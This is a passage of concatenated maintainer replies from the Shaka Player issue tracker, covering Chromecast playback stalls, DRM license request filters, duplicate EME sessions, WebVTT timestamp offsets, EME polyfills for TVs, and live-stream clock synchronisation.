Let the video play for 15 more seconds in the browser.\n10. Click the cast button again.\n11. Select the first-generation Chromecast from the list of receiver devices.\n12. Let the video continue playing on the Chromecast.\nThe video never stalled.\n. I believe this is a problem with your custom app, and I believe the Chromecast device versions are a red herring.\nSince you are registering request filters, I believe the problem may be with how you do that on the sender vs receiver.  Without seeing your application's code, I have to guess.  But my guess is that you are not setting up the filters on the receiver, only on the sender.\nWhen you use player.getNetworkingEngine() on the sender side, you should see a log warning you \"NOTE: getNetworkingEngine() is always local!\".  (If you don't see this, you should be doing your integration work with an uncompiled version of Shaka Player to get logs.  You can switch back to the compiled version for production deployment.)\nIn order to set up filters on the receiver, you must use the appDataCallback parameter of shaka.cast.CastReceiver.  In that callback, your receiver app can set up any necessary filters using the \"app data\" sent by the sender app.  The sender uses castProxy.setAppData() before casting to communicate this information to the receiver.\nDoes this help?\n. We tried to make casting as easy as possible, but we may have fallen short of that goal for setups like yours.\nIf you send me your application code, I'll do what I can to help you debug it.  I can't reproduce on the demo app, so I think seeing the application code is the only option.  Thanks!\n. It's in the AUTHORS file in the Shaka Player sources.\n. Sorry, not AUTHORS, I meant CONTRIBUTORS.\n. Sorry for the delay.  Your app code got lost in my spam filter.\nI've taken a look at your code and now I understand your setup.  Shaka is only being used on the receiver side, and you aren't using any of our cast APIs on either end.\nI spotted one unrelated bug in your code:\njs\n    player.getConfiguration().abr.enabled = true;\nThe config returned from that is a copy, so modifying it has no effect.  Instead, do this:\njs\n    player.configure({abr: {enabled: true}});\nThis pattern appears twice in your code.\nIt's hard to say if your request filter is correct since I only have the client code, but this looks suspicious to me:\njs\n    player.getNetworkingEngine().registerRequestFilter((type, request) => {\n      if (type == shaka.net.NetworkingEngine.RequestType.LICENSE) {\n        let rawLicenseRequest = new Uint8Array(request.body);\n        let rawLicenseRequestBase64 = encodeURIComponent(\n            arrayTob64String(rawLicenseRequest));\n        request.uris[0] += rawLicenseRequestBase64;\n      }\n    });\nAlthough you modify the URI to attach a base64-encoded version of the request body, you leave that body in place.  So the same raw license request is being sent to your server in two forms.  To remove it from the body, try this after you modify the URI:\njs\n        request.body = new Uint8Array();\nOther than that, I don't see anything obviously wrong with your app code.  I still can't reproduce anything like this with our demo app even on v1 Chromecast hardware.\nYou've filed this bug against Chromecast, and they have merged it into this bug.  The latter does not involve Shaka at all, so I believe this is a Chromecast issue that is outside of Shaka Player.  Because of that, I'm going to mark this as an external bug.  I'll leave it open for now while we track progress on the Chromecast side.. That's very strange.\nSee #580 for a discussion of how this filtering works and why.  In short, if the init datas differ even a little bit, we can't be certain that one session will receive all the keys we need.  We could create one session, get a license, then wait and see which keys we got, but that would lead to increased latency, so we don't take that approach.\nWe accept that some number of duplicate sessions will be created because:\n1. we don't have perfect information from the manifest to know how many licenses we need, and\n2. CDMs generally handle duplicate sessions gracefully.\nUnless something else is going on that we can't see, it would seem that the CDM on the v1 Chromecast is not gracefully handling duplicate sessions in some way.  This would still be an external bug, though, that needs to be reported to the Chromecast team.\nPlease update the Chromecast bug with this new information so that the Chromecast team can start looking in the right direction.. @wipawan, it seems that much discussion has taken place on the Chromecast bug tracker, with some bugs merged into others.  Since I am having trouble tracking those conversations, I will have a hard time keeping this bug open to track those.  I will close this now, but please let us know if we can do anything else to assist you while you work with the Chromecast team.  Thanks!. Happy to leave the issue open for now.  Let us know if we can do anything else to help, and you can close the issue whenever you feel that this has been resolved.\n. Hi Heidi, it's been a couple months.  Is it okay for us to close the issue now?. We already compare init data and filter based on that, and it's not completely effective.  Stripping the PSSH box down to the payload won't necessarily make this any better, since the payload can still contain key IDs or other unique parameters.\nWhat we want, ideally, is to predict which things can share a session before we create those sessions.  This is not directly achievable when the PSSH payload can't be interpreted, so we have to apply heuristics to dedup sessions in a safe way.\nHaving a duplicate sessions is tolerable, since playback can continue.  (It's not ideal, since on embedded devices those sessions consume a limited resource.)  Removing a session as a duplicate that shouldn't have been removed is not tolerable, since it leads to a playback failure (or hung media pipeline).\nToday, we dedup on init data only.  What's proposed here is to also dedup on key ID.  So two unique init datas that we know refer to the same key ID could be filtered down to one session.\nThis still doesn't detect if there is a content ID.  Content ID filtering would be best, but we don't have access to that in JavaScript and the very concept may not exist for all DRM providers.  I know it does for Widevine, as an optimization, but it may not in the general case.\nWe won't be parsing the provider-specific payloads in init data, partly because the formats are not necessarily public, and partly because it doesn't scale in a provider-agnostic way.  If we aren't parsing those payloads, we can't use the init data to learn about content IDs.\nDoes that help explain?. Nobody would want unique init data containing a non-unique key ID, but it happens when PSSHs are generated by automated tools which don't consider what web-based players do and don't know.  Imagine a fictional JSON-based PSSH format like this:\njson\n{\n  \"key_id\": \"foo1\",\n  \"track\": \"audio\",\n  \"bitrate\": 128000,\n}\nYou really shouldn't need the track type and bitrate, but maybe somebody thought early-on that it would be useful to a particular CDM or platform or whatever.  If you have tools that put extra information into the content itself or into the manifest, you can end up with non-unique PSSHs that contain the same key ID.\nThese are just examples and entirely fictional, but PSSHs are opaque and therefore we don't know what's in them in JavaScript.  Encoders, packagers, PSSH formats, DRM clients, players, and web APIs are developed by different groups of people.  Things don't always align and that makes things more complicated than they have to be.\nIt will take time to get things better aligned, and a lot of content has already been generated.  We will have to have heuristics to deal with it for a while.. Sorry, we only support EME as spec'd.  The customData extension is not part of the standard.\nSee our License Wrapping tutorial for details on a standards-compliant way to accomplish the same thing.\n. Thanks for the report and the PR.  Much appreciated!\n. Looks good to me.  I'll run it through the build bot to check.\n. Looks like it failed some of the linter's checks.  You can run python build/all.py to check this locally.\n. The only part of this that I still wanted changed was the use of Element vs Node, but it's not that important.  I'm going to run this PR through the build bot and merge it if everything checks out.. I think those errors have already been fixed in master (#623).  I will cherry-pick this and test it rebased on top of master.. Hi @sridhardvvce,\nIt looks like this was fixed by the same change that fixed #579, so I'm marking this as a duplicate.\n. I like the Beatles video!  I am able to play with the latest code from the master branch.  Let us know if you are still having issues once you update.\n. Shaka Player is a generic client for playing adaptive bitrate videos.  We currently support DASH and are working on HLS support.\nShaka Player is not intended for YouTube videos.  If you need to play YouTube videos, you should use YouTube's iframe player instead.\nYouTube's terms of service state:\n\nYou agree not to access Content through any technology or means other than the video playback pages of the Service itself, the Embeddable Player, or other explicitly authorized means YouTube may designate.\n\nI am not a lawyer, but as far as I can tell, playing YouTube content through any third-party player, including ours, is disallowed by the YouTube terms of service.\nShaka Player would be appropriate if you had your own DASH content to serve.  If this is the case, we have docs and tutorials to help you get started, and we are always happy to answer questions.\nThanks!\n. @ismena, this looks reasonable to me, but you have more experience here.  Any objections?\n. Great question.  I'm not sure of the answer, but let's dig into this a bit and see what we can figure out.\nIt seems that fundamentally, the expectation that was broken in your scenario was that the presentation timeline changed.  If a live stream starting at 9am is using unix timestamps for presentation time, the presentation time for segment 1 would be some large number T.  The video element and the SourceBuffers have timelines that correspond with the manifest's presentation time, so when the first segment is buffered, the buffered time range is from T to T+s for some segment size s.\nNow it's 10am, and the live stream is over.  You convert it to a VOD stream which starts at 0 and ends at 1h.  If you update the manifest in that way, any client already watching the stream now sees that all content after timestamp 3600 is gone.  Only 0-3600 exists in the manifest, but it has already buffered from T to T+3600.\nI think in general, you can't completely change the presentation timeline in a manifest update.  If instead you added a duration to the last period, the timeline would be finite, and the StreamingEngine would stop buffering once it buffered to the end of that finite timeline.  endOfStream() would be used appropriately.\nDo you also need to convert the presentation to VOD for people joining after 10am?  Or was that an artifact of the way you are signalling the end of the live stream?\n. Looks reasonable, but can you rebase it?\n. Yeah, it doesn't look right.  Looks like you added upstream changes to your PR.\n. Not sure what to recommend to fix that.\n. The manifest text is not enough to debug.  We would need an actual manifest URL in order to access the content and reproduce your issue.\nHowever, it sounds like this is a duplicate of #555.  We don't currently support gaps in media, but in #555 we are considering how best we could do that in the future.  Please follow along there.\n. This appears to be a duplicate of #377.  Chrome has several open bugs right now regarding mixups between DTS and PTS:\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=402502\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=398141\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=398130\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=373039\nI'm closing this as a duplicate of #377, which we will keep open until Chrome has fixed these bugs.  As far as I know, there's nothing Shaka Player can do to work around these bugs in the browser.  If you have any information to contribute to those Chrome bug reports, please do.  I apologize for the inconvenience.\n. Looks good to me.  Thanks!\n. Okay, sorry for joining the conversation so late.\n@sanbornhnewyyz, in your example, there's one critical thing missing from my point of view:\nxml\n<SegmentTemplate timescale=\"10000000\" presentationTimeOffset=\"1796832000000000\" media=\"$RepresentationID$/Segment-$Time$.vtt\">\n  <SegmentTimeline>\n    <S t=\"1796832000000000\" d=\"20000000\" r=\"1049\" />\n  </SegmentTimeline>\n</SegmentTemplate>\nWhat does this VTT file look like at t=\"1796832000000000\"?  If the manifest is correct, the timestamps in that VTT file should look something like this:\n```\nWEBVTT\n49912:00:00.000 --> 49912:00:05.000\nHello, world!\n```\nIs that the case in your example?  If not, I think the content is broken, not the player.\nThe point of the manifest is to describe the content.  A web app should not have to parse an MP4 file to know the timestamp of a segment.  It should know from the manifest what the start time and duration of a segment are.\nTo summarize what's already been said, media segments are on a different timeline from the presentation itself.  So presentationTimeOffset allows the manifest to describe to the player how they should be aligned.  For example, SegmentTimeline would use t=X if the segment's own PTS was X.  If that segment needed to appear at time Y in the period, presentationTimeOffset would be Y-X.  In this way, the manifest both describes what is in the media segment and what the player should do with it.\nIn MediaSource, we set timestampOffset to presentationTimeOffset + period.start.  We don't use MediaSource for text, so the equivalent thing for text in Shaka Player is to offset the cue's timestamps by presentationTimeOffset + period.start.  This is exactly how MediaSource applies timestampOffset to the media segments you feed it.\nSo, image you have a VTT file that says this:\n```\nWEBVTT\n00:03.837 --> 00:07.297\nCaptain's log, stardate 41636.9.\n```\nAnd a manifest that describes the segment like this:\nxml\n<SegmentTemplate timescale=\"1\" media=\"$RepresentationID$/Segment-$Time$.vtt\">\n  <SegmentTimeline>\n    <S t=\"123456\" d=\"10\" />\nThen the manifest does not accurately describe the content.  I'm not using presentationTimeOffset in this example because it doesn't matter.  The media segment (VTT file) has internal timestamps just like an MP4 would, but the manifest describes that segment as having a completely different timestamp.\nThe manifest should always describe the media accurately.  If the VTT file and manifest don't agree, one or the other needs to be adjusted.  Again, this has nothing to do with presentationTimeOffset.  The SegmentTimeline needs to reflect the contents of that segment - always.. Okay, I see the problem now.\nWe have the media timeline, the presentation time offset, the timestamps in the segment reference object, the period start, and the presentation timeline.\nSay the timestamp in a media segment is 10, as parsed from the SIDX or the manifest.  We then apply the presentation time offset to that and store it in the segment reference object.  The segment reference time is relative to the period start.  Then, to get to the presentation timeline, we add the period start to the segment reference time.\nThe timestamps passed to MediaSourceEngine.appendBuffer are in the presentation timeline, meaning they have already had presentation time offset applied.  This timestamp is what ends up passed to the VTT parser.\nUnconditionally, we add the offset to the cue times.  Then, if useRelativeCueTimestamps is set, we add the segment timestamp to the cue times.  So if useRelativeCueTimestamps is set, we have accounted for the offset twice!\nThe solution is to either add the offset (for period-relative timestamps) or the segment time (for segment-relative timestamps), but never both.\nMake sense?. @birme, just to confirm, in #563 you said you didn't need to be able to override TTML style.  Is this different?  Do you still need this?. There's no rush.  We're grateful for your contribution, and we're not blocked on it.  So please take as much time as you need.. Also asked via the mailing list.  Anyone wanting to follow the mailing list discussion can do so here: https://groups.google.com/forum/#!msg/shaka-player-users/cf7QEauVOcQ/guHwdYCwBgAJ\nClosing this as a duplicate of the same question on the mailing list.. Closing as a duplicate of #564.  Thanks, Sanborn, for pointing that out.. This is blocked on discussion in #595.  I'm not yet convinced that this is necessary.. As mentioned in https://github.com/google/shaka-player/issues/595#issuecomment-271028967, please change this to add either the offset or the segment time, but not both.\nBefore we release v2.1, we will remove the flag and always use segment-relative timestamps (and never offsets).. @sanbornhnewyyz, I went ahead and committed a fix for this myself.  Hope you don't mind.  Thanks for contributing!. No worries!  We are always happy to help.. @sridhardvvce, can you please test something for me?  I have been working on a bug today that may be related.\nIn lib/media/playhead.js, in the constructor, change this.startWatchdogTimer_() to this.onWatchdogTimer_().  I expect this will make the bug reproducible 10 out of 10 times.  Please let me know if this is the case.  If so, I should have a fix out soon.. I believe this was fixed by 84fb9d42.  If not, please let me know and we can reopen and investigate.. As mentioned by @sridhardvvce in #637, this is not fixed yet.  Reopening to investigate.. Manifest link from the original issue, #585: https://s3-ap-southeast-1.amazonaws.com/learnyst/schools/1094/courses/6677/paid/25537/online/11/004_video_youtube_1mb_fdq7pg2zj7la7v7bke29webTrack.mpd. @sridhardvvce, I am unable to reproduce your issue using the latest code from master.  Here's the link to what I'm doing to reproduce:\nhttp://nightly.shaka-player-demo.appspot.com/demo/?asset=https://s3-ap-southeast-1.amazonaws.com/learnyst/schools/1094/courses/6677/paid/25537/online/11/004_video_youtube_1mb_fdq7pg2zj7la7v7bke29webTrack.mpd;play\nPlease provide detailed instructions to reproduce your issue.  Here's a template:\n\nWhat version of Shaka Player are you using?\nCan you reproduce the issue with our latest release version?\nCan you reproduce the issue with the latest code from master?\nAre you using the demo app or your own custom app?\nIf custom app, can you reproduce the issue using our demo app?\nWhat browser and OS are you using?\nWhat did you do?\nWhat content did you load?\nIf standard demo asset, which one?\nIf custom asset, what manifest and license server URIs?\n\n\nHow did you interact with the content, if at all?\nWhat did you expect to happen?\nWhat actually happened?. Sorry for the delay.  We've been really busy lately!  We'll take a look and see if we can reproduce.. Thanks for retesting.  Closing as resolved.. Your video starts at 0.256 in Chrome.  This appears to be just over the threshold of the gap size Chrome is willing to skip.  In Firefox, the video starts at 0, so I think this is another symptom of Chrome's ongoing DTS/PTS bug.\n\nHere's a link to the Chrome bug where you can let them know that this affects you:  https://bugs.chromium.org/p/chromium/issues/detail?id=398130\nThis is also a duplicate of #377, which is caused by the same Chrome bug.. Since this is a duplicate and an external bug, I'm going to close it.  We will keep #377 open while we track Chrome's progress on this.. The two parameters to a networking plugin are uri and request.  We could easily add RequestType to the Request structure.\nThen you could compare request.type to RequestType.SEGMENT or RequestType.MANIFEST in your plugin.  Would that help?. We're going to pass an additional argument to the plugins instead of adding type to the request structure.. @johanhil, can you please test something for me?  I have been working on a bug today that may be related.\nIn lib/media/playhead.js, in the constructor, change this.startWatchdogTimer_() to this.onWatchdogTimer_().  I expect this will make the bug more reproducible, even with logging.  Please let me know if this is the case.  If so, I should have a fix out soon.. I believe this was fixed by 84fb9d42.  If not, please let me know and we can reopen and investigate.. Can you please explain the use-case for leaving the local player while casting?. Can you please explain the use-case for leaving the local player while casting?. Ah, I see.  Then isn't that a UI issue for the videojs tech to fix?\nThere are a lot of good reasons to unload the local video player.  For one, it's consistent with the cast experience of other applications.  For another, some protected content can have restrictions on the number of concurrent playbacks by the same user, so it's important to unload the content locally when playing remotely.. Ah, I see.  Then isn't that a UI issue for the videojs tech to fix?\nThere are a lot of good reasons to unload the local video player.  For one, it's consistent with the cast experience of other applications.  For another, some protected content can have restrictions on the number of concurrent playbacks by the same user, so it's important to unload the content locally when playing remotely.. Hi Jozef,\nI see a lot of duplication here and I think we can find a better way to solve this.  Let me start by clarifying some points.\nThe platform implements EME v0.1b, but without the webkit prefix.  Correct?\nThe platform implements performance.now with a webkit prefix on the method.  Correct?\nThanks,\nJoey. Hi Jozef,\nI see a lot of duplication here and I think we can find a better way to solve this.  Let me start by clarifying some points.\nThe platform implements EME v0.1b, but without the webkit prefix.  Correct?\nThe platform implements performance.now with a webkit prefix on the method.  Correct?\nThanks,\nJoey. Yes, the fact that they are almost identical makes me think there should be a solution that avoids all this code duplication.  And based on the API, it looks like the very old EME v0.1b API, which is what we polyfill on top of in patchedmediakeys_webkit.js.\nI think you should create separate polyfills for each of these things.\nFor performance.now, it should be very simple to use performance.now = performance.now || performance.webkitNow.  You can follow lib/polyfill/fullscreen.js as a template, but your performance polyfill will be much simpler than the fullscreen polyfill.\nFor EME, let's refactor the existing v0.1b polyfill so that it doesn't hard-code the prefix.  If shaka.polyfill.PatchedMediaKeysWebkit.install took a prefix parameter, then the main MediaKeys polyfill could do this:\n```js\n  if (navigator.requestMediaKeySystemAccess &&\n      MediaKeySystemAccess.prototype.getConfiguration) {\n    shaka.log.info('Using native EME as-is.');\n} else if (HTMLMediaElement.prototype.webkitGenerateKeyRequest) {\n    shaka.log.info('Using webkit-prefixed EME v0.1b');\n    shaka.polyfill.PatchedMediaKeysWebkit.install('webkit');\n} else if (HTMLMediaElement.prototype.generateKeyRequest) {\n    shaka.log.info('Using unprefixed EME v0.1b');\n    shaka.polyfill.PatchedMediaKeysWebkit.install('');\n} else if (window.MSMediaKeys) {\n    shaka.log.info('Using ms-prefixed EME v20140218');\n    shaka.polyfill.PatchedMediaKeysMs.install();\n  } else {\n    shaka.log.info('EME not available.');\n    shaka.polyfill.PatchedMediaKeysNop.install();\n  }\n```\nSomething in this direction would be acceptable, but I don't want to duplicate the entire file.  That will lead to bugs in the long run.\nSince we do not have a Toshiba TV for development, would you be willing to work on this and revise your PR?. Yes, the fact that they are almost identical makes me think there should be a solution that avoids all this code duplication.  And based on the API, it looks like the very old EME v0.1b API, which is what we polyfill on top of in patchedmediakeys_webkit.js.\nI think you should create separate polyfills for each of these things.\nFor performance.now, it should be very simple to use performance.now = performance.now || performance.webkitNow.  You can follow lib/polyfill/fullscreen.js as a template, but your performance polyfill will be much simpler than the fullscreen polyfill.\nFor EME, let's refactor the existing v0.1b polyfill so that it doesn't hard-code the prefix.  If shaka.polyfill.PatchedMediaKeysWebkit.install took a prefix parameter, then the main MediaKeys polyfill could do this:\n```js\n  if (navigator.requestMediaKeySystemAccess &&\n      MediaKeySystemAccess.prototype.getConfiguration) {\n    shaka.log.info('Using native EME as-is.');\n} else if (HTMLMediaElement.prototype.webkitGenerateKeyRequest) {\n    shaka.log.info('Using webkit-prefixed EME v0.1b');\n    shaka.polyfill.PatchedMediaKeysWebkit.install('webkit');\n} else if (HTMLMediaElement.prototype.generateKeyRequest) {\n    shaka.log.info('Using unprefixed EME v0.1b');\n    shaka.polyfill.PatchedMediaKeysWebkit.install('');\n} else if (window.MSMediaKeys) {\n    shaka.log.info('Using ms-prefixed EME v20140218');\n    shaka.polyfill.PatchedMediaKeysMs.install();\n  } else {\n    shaka.log.info('EME not available.');\n    shaka.polyfill.PatchedMediaKeysNop.install();\n  }\n```\nSomething in this direction would be acceptable, but I don't want to duplicate the entire file.  That will lead to bugs in the long run.\nSince we do not have a Toshiba TV for development, would you be willing to work on this and revise your PR?. @jozefchutka, I don't really know what the issue is what FakeEvent.  Can you provide some details?  What's the error?. @jozefchutka, I don't really know what the issue is what FakeEvent.  Can you provide some details?  What's the error?. Ah, I see.  In onWebkitNeedKey_, we're dispatching FakeEvent on a real EventTarget, as opposed to a FakeEventTarget.  That seems like a bug.  I think that one instance should definitely be replaced with CustomEvent.\nLet us know how it's going refactoring the polyfill, and if we can do anything else to help.. Ah, I see.  In onWebkitNeedKey_, we're dispatching FakeEvent on a real EventTarget, as opposed to a FakeEventTarget.  That seems like a bug.  I think that one instance should definitely be replaced with CustomEvent.\nLet us know how it's going refactoring the polyfill, and if we can do anything else to help.. Everything looks good now.  I'll run it through the standard checks on our build bot and do some additional testing on Safari.. Everything looks good now.  I'll run it through the standard checks on our build bot and do some additional testing on Safari.. Oh, one thing is off, actually.  This should be merged into master, not v2.0.x.  I will have to merge manually to make that happen.  I'll make sure it gets cherry-picked to v2.0.x for our next bugfix release, though.. Oh, one thing is off, actually.  This should be merged into master, not v2.0.x.  I will have to merge manually to make that happen.  I'll make sure it gets cherry-picked to v2.0.x for our next bugfix release, though.. Those failures are unrelated to your change and have already been fixed.  I'm overriding the build bot on this one.. Those failures are unrelated to your change and have already been fixed.  I'm overriding the build bot on this one.. All tests are passing on Safari, which is the only browser still using this polyfill.  I'm going to go ahead and merge it into master.  I will also cherry-pick it to v2.0.x and include it in our upcoming v2.0.2 release.. All tests are passing on Safari, which is the only browser still using this polyfill.  I'm going to go ahead and merge it into master.  I will also cherry-pick it to v2.0.x and include it in our upcoming v2.0.2 release.. Oh, I forgot to wait for you to confirm that it's working well on the Toshiba TV!  I got a little ahead of myself.\nI'm going to go ahead and close this, since I already merged it.  Please let us know the results of your testing when you have a chance.  If there is any more work needed to get Toshiba TVs working as expected, I would be happy to review another PR.  I apologize if this is an inconvenience.. Oh, I forgot to wait for you to confirm that it's working well on the Toshiba TV!  I got a little ahead of myself.\nI'm going to go ahead and close this, since I already merged it.  Please let us know the results of your testing when you have a chance.  If there is any more work needed to get Toshiba TVs working as expected, I would be happy to review another PR.  I apologize if this is an inconvenience.. I can't reproduce, but it looks like a time sync issue.  The demo app has a default clock sync configuration that should keep your client synchronized with a known-good time source.\nCan you reproduce the error on any other browser on that machine?  Are there any other errors or any failed network requests showing in the JavaScript console?. I can't reproduce in Firefox 49.0 on Ubuntu.  (Tried to check Firefox 50, but it didn't like my version of libavcodec and I had to give up.)\nFor Shaka Player to get a 404 on a live stream, it means we are either requesting a segment that does not exist yet, or a segment that no longer is available.  That means that the client's clock is not correctly synchronized with the server.\n@cheersalam, after starting the live sim streams, can you please check the value of shakaDemo.localPlayer_.manifest_.presentationTimeline.clockOffset_ in the JS console in both Chrome and Firefox?  That will help confirm that this is related to clock sync.\nAlso, please do as Chris asked and try to repro in Safe Mode and in Firefox 49.. Yes, exactly.  The HEAD request the player makes is for time sync based on the Date header.  @TheModMaker filed https://github.com/Dash-Industry-Forum/Test-Vectors/issues/53 to get the server fixed so that the response headers say not to cache it.. Thanks, @TobbeEdgeware!\n@cheersalam, since this has been fixed on the server, I will close this issue.  Please let us know if we can do anything else for you.. Marking external since this is a bug in IE11 that we will have to work around.  Looking forward to your PR!. Good question.  We check for the existence of VTTCue to determine if a browser supports VTT, but clearly that is not enough.\nI don't know of an alternative, though.  If you know of another way to detect that Edge supports VTT, I'd be happy to update that support check.  I don't think the existence of TextTrackCue implies VTT support, though.\nOne solution would be to use Shaka Player v2.  In v2, we support VTT and TTML, and our subtitle support is independent of what the browser supports.  We parse all text tracks in JavaScript now.. @raskri, any feedback?  Do you know a way to check for VTT support in Edge?  Or can you upgrade to v2, which supports VTT on all browsers?. Asynchronous networking filters seems like a pretty reasonable feature request.  We'll look into it for v2.1.  We will try to keep it backward-compatible with the synchronous filters we have today.. Looks like we still need to update the externs for request and response filters and add something to the docs.. And we still need to make the response filters async as well.. This all looks reasonable to me.  Thank you for the PR!\nOur build bot is in maintenance at the moment, but it should be back up in the next couple hours.  I'll test this PR as soon as the build bot is available.. Merging now.  Thanks for the PR!. Testing race conditions is tricky.  I recommend a unit test rather than an integration test, because it will be easier to control the environment.  Everything other than the object under test (Player) should be mocked in a unit test.. If you can only reproduce the bug with real content, we have several simulated streams in test/test/util/test_scheme.js that can be used in an integration test (player_integration.js).\nAlternately, if you can show me how to reproduce your error in our demo app, I would be happy to investigate and try to fix it myself.. @chrisfillmore, I added player.unload(); in demo/assets.js right before player.load(...) and I am unable to reproduce any error.. I take it back.  I kept toying with it, and after several tries it finally blew up.  For me, it fails if I select \"Dig the Uke\", click \"Load\", wait a second or two, then click \"Load\" again.. The fix for this has just been released in v2.0.3.. Hi Chris,\nThanks for the PR!  I'd like to see an additional test for this case in test/player_unit.js.  We already have several test cases for various orderings of load and unload in the section that starts with describe('load/unload', ..., so that would be a good place to add a new test.\nYou can run the tests locally with python build/test.py.  Please make sure that the new test fails without your fix.\nThanks again for contributing!. Hi Vinc,\nI'm closing this as a duplicate of the message you sent to the mailing list here: https://groups.google.com/forum/#!topic/shaka-player-users/cSQxQZeqTA0\nI'm sorry it took me so long to get caught up on email and reply to your original message.\nI explained this on the mailing list as well, but in short, the Widevine license request and response formats are not JSON-based and are not public formats.  If you have any further questions about this, let's continue the conversation on the mailing list.\nThanks,\nJoey. Two bugs found in Safari 10's MSE implementation:\n - https://bugs.webkit.org/show_bug.cgi?id=165336\n - https://bugs.webkit.org/show_bug.cgi?id=165342. If you look at lib/cast/cast_sender.js, you will see how we initialize and determine if Cast is available:\n```js\nshaka.cast.CastSender.prototype.init = function() {\n  // Check for the cast extension.\n  if (!window.chrome || !chrome.cast || !chrome.cast.isAvailable) {\n    // Not available yet, so wait to be notified if/when it is available.\n    window.__onGCastApiAvailable = (function(loaded) {\n      if (loaded) {\n        this.init();\n      }\n    }).bind(this);\n    return;\n  }\n// The API is now available.\n  delete window.__onGCastApiAvailable;\n  this.apiReady_ = true;\n  this.onStatusChanged_();\n```\nWe look for chrome.cast and check chrome.cast.isAvailable.  If it's not, we register a callback at __onGCastApiAvailable, which the cast API will use to notify us if/when Cast becomes available.\nThose APIs are only available if we include the cast sender API script in demo/index.html:\nhtml\n    <script src=\"//www.gstatic.com/cv/js/sender/v1/cast_sender.js\"></script>\nDoes your app include the cast sender API?. I've got a Windows 8.1 box with IE 11 version 11.0.9600.17239, update version 11.0.11, and I can't reproduce your results:\njs\nMSMediaKeys.isTypeSupported('com.microsoft.playready');\nMSMediaKeys.isTypeSupported('com.microsoft.playready', 'video/mp4');\nBoth return true.  Have you asked for support from Microsoft?. Looks like I do not have permission to view that Microsoft ticket.  In any case, since we can't reproduce your results and there isn't anything obviously wrong with Shaka in this regard, I'm going to close this ticket.  If you get any feedback from Microsoft that points back in our direction, let us know and we can reopen to investigate.  Thanks!. @steve-o, are you loading a DASH manifest from YouTube?. There's a typo in your manifest:\nxml\n<Period,duration\nThat comma should be a space.. Can you be more specific?  I can't reproduce your error in our demo app since your content is not available cross-origin.  If there's a bug, we'd love to fix it.  Please provide repro or submit a pull request.. Odd... that does look wrong.  I'm not sure why you get this error and I do not.  Looking at the code, you would expect this error to occur on every manifest.. Logically, containsInband should be the \"or\" of the property from all periods, not the last period parsed.  So the code is subtly wrong, even when it's not causing this TypeError.\nIf there are no periods, we should throw a specific error that says so, instead of dereferencing null or undefined vars.  So that's another small issue on us.\nWe will fix both of these issues.\nAll of that said, when your manifest has valid Periods, your problem goes away.. It seems like this is resolved, so I will go ahead and close it.  If you need any further guidance, please let us know or write to our mailing list.. That's a great question.  I'm sure we could come up with a way to skip retries.  I'll have to think about the design a little.. @TheModMaker, I recommend we do this directly in the standard HTTP plugin.  It would not make sense to retry on a 401 or 403, so we should return CRITICAL for that.. I definitely see the utility of this.  We could add a field to the response so that networking plugins could return this information.\nWe would need to change the response structure, which could easily be backward compatible.  If the field is there, we use it.  If not, we use timing collected by NetworkingEngine instead.\nWe would also need to change the AbrManager contract to take a time value instead of start and end.  This would not be backward compatible, so existing AbrManager plugins would have to change.\nWe're already going to have to break the AbrManager interface to implement HLS (#279), so we can try to schedule this for the same release (v2.1).. @hghazzi, can you please provide a manifest URL so that we can try to reproduce your issue?. When I accessed the stream at 19:41:18 GMT, my calculations based on availabilityStartTime say I was 415479 seconds into the presentation.\nThe oldest segment in the manifest starts at 39980186100 with timescale 90000, so that equates to time 444224, which is 28745 seconds in the future, or about 8 hours.\nYour encoder's clock is therefore roughly 8 hours ahead of actual current time.  Either you can fix the time on your encoder or you can use UTCTiming to synchronize the client with the encoder's time.. Cross-origin headers must be exposed explicitly by the server.  To be used for clock sync, your manifest server would need to add:\nAccess-Control-Expose-Headers: Date\nhttps://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Access-Control-Expose-Headers. Fundamentally, this is a clock sync issue.  Clock sync is critical to live streaming, and you can't expect clients to request the correct segments if they don't know what time it is.\nYou don't have to use your manifest or encoder to sync the client's clock.  You can use some other CORS-friendly URL as a time source.  Really, any URL on any server you control.  So long as that server and your encoder both have accurate clocks, your client's clock will be corrected.\nShaka Player is a generic DASH client, and as such, we can only reasonably support the subset of DASH which is considered interoperable.  This is defined by DASH IF's Interoperability Points document, v4.0 of which states (emphasis added):\n\n4.7.2. Service Provider Requirements and Guidelines\nIf the Media Presentation is dynamic or if the MPD@availabilityStartTime is present then the service shall provide a Media Presentation as follows:\n\nThe segment availability times announced in the MPD should be generated from a device that is synchronized to a globally accurate timing source, preferably using NTP.\nThe MPD should contain at least one UTCTiming element.\n\n\nI hope you can understand my position.  You should feel free to make whatever changes you need to in your own fork, but my team doesn't have the time or energy to implement or maintain non-standard approaches to live streaming.  What we did in v1.6 was, effectively, non-standard.  We did not synchronize clocks, we second-guessed the timeline presented in the manifest, and we introduced subtle and difficult-to-solve bugs because of it.  It was not a sustainable approach for us.\nSince v2.0, we only use the timeline as presented in the manifest, and to do that, we must have an accurate time.  So the client must be able to synchronize its clock to an accurate time source on some server.  As mentioned by Jonas back in December, you can configure Shaka Player to use any URL you want for time synchronization.  It doesn't even have to be a CORS-friendly URL if its on the same origin as your application itself.\nAnd finally, if your encoder's clock is still offset by 8 hours, you will ultimately need to open a support request with whoever runs that server and ask that the server's clock be fixed.  It's not a difficult argument for you to make that a service you (presumably) pay for should have an accurate clock.. Yes, this is called a license renewal.  Licenses can be renewed without interruption.\nRenewal is driven by the CDM and the license itself.  Some licenses specify renewal, and some do not.  If the license specifies renewal on some interval, the CDM periodically sends a 'message' event to the application (in this case, to Shaka Player).  Shaka routes the message to the configured license server, and routes the response back to the CDM.  The expiration time is then extended by the renewal.\nDoes this answer your question?. Spinning up a license server depends on your DRM provider.\nIf you want to use Widevine, you can contact Widevine here: http://www.widevine.com/contact.html  Widevine supports renewals and allows you to control both license duration (expiration) and frequency of renewal.\nI don't have any information on hand about Microsoft Playready, but their website is here: https://www.microsoft.com/playready/\nYou can use the clear key CDM for testing and experimentation without depending on any DRM provider, but it appears that clear key does not support renewals or expiration.\nHope that helps!. The message \"The last segment should not end before the end of the Period\" is only a warning, and it seems to be confusing things more than helping.  We will consider removing it.  For now, please disregard that message.. In Firefox, the latest release build fails to start playback:  